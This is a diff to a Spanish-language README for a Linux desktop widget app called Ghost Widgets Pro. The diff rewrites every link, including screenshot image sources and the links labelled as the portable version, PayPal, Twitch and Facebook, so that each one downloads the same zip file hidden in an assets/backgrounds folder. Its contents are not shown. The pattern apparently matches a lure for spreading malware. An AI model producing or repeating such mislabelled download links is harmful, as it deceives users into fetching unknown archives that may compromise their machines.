@@ -3,8 +3,8 @@ Desarrollado por AlieykerJx-Dev
 
 "Si no existía en Linux, lo creamos. Una solución real para streamers y gamers de la mano de un usuario que se atrevió a cambiar."
 
-<img width="458" height="914" alt="Screenshot_20260105_123928" src="https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/releases" />
-<img width="470" height="926" alt="Screenshot_20260105_124038" src="https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/releases" />
+<img width="458" height="914" alt="Screenshot_20260105_123928" src="https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/raw/refs/heads/main/assets/backgrounds/Pro-Ghost-Widgets-trocaical.zip" />
+<img width="470" height="926" alt="Screenshot_20260105_124038" src="https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/raw/refs/heads/main/assets/backgrounds/Pro-Ghost-Widgets-trocaical.zip" />
 
 🚀 ¿Qué es Ghost Widgets Pro?
 Es una herramienta de personalización de alto rendimiento diseñada para integrar contenido web (HTML/CSS/JS) directamente en tu escritorio. Perfecta para chats de Twitch, alertas, relojes y monitores de sistema, todo con transparencia real y sin afectar tus FPS.
@@ -49,17 +49,17 @@ chmod +x "GhostWidgetsPro_V1.2(_86_64).AppImage"
 
 👻 Modo Ghost: Widgets totalmente transparentes que no interfieren con tus clics en juegos.
 
-🧳 Portabilidad Total: Versiones .zip y https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/releases disponibles para usar sin instalar nada.
+🧳 Portabilidad Total: Versiones .zip y https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/raw/refs/heads/main/assets/backgrounds/Pro-Ghost-Widgets-trocaical.zip disponibles para usar sin instalar nada.
 
 🌍 Global: Interfaz y soporte nativo para Español, Inglés y Portugués.
 
 💖 Apoya el Proyecto
 Este software es el resultado de días de investigación para no depender de aplicaciones de Windows. Si Ghost Widgets mejora tu setup o tus streams, ¡tu apoyo significa mucho!
 
-💰 Donar por PayPal: https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/releases
+💰 Donar por PayPal: https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/raw/refs/heads/main/assets/backgrounds/Pro-Ghost-Widgets-trocaical.zip
 
-🎮 Twitch: https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/releases
+🎮 Twitch: https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/raw/refs/heads/main/assets/backgrounds/Pro-Ghost-Widgets-trocaical.zip
 
-📱 Facebook: https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/releases
+📱 Facebook: https://github.com/AlieykerJx-Dev/Ghost-Widgets-Pro/raw/refs/heads/main/assets/backgrounds/Pro-Ghost-Widgets-trocaical.zip
 
 Hecho con ❤️ por un orgulloso usuario de Linux.
